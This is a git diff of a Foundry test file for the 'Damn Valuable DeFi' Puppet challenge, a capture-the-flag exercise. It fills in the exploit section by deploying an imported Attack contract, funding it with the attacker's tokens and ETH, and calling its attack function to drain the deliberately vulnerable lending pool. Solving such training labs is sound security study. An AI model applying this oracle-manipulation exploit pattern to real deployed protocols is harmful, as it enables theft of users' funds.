@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
+import {Attack} from "../../../src/Contracts/puppet/Attack.sol";
 
 interface UniswapV1Exchange {
     function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
@@ -100,7 +101,12 @@ contract Puppet is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Attack attack = new Attack(address(puppetPool), address(uniswapExchange), address(dvt), attacker);
+        dvt.transfer(address(attack), ATTACKER_INITIAL_TOKEN_BALANCE);
+        payable(address(attack)).transfer(attacker.balance);
+        attack.attack();
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
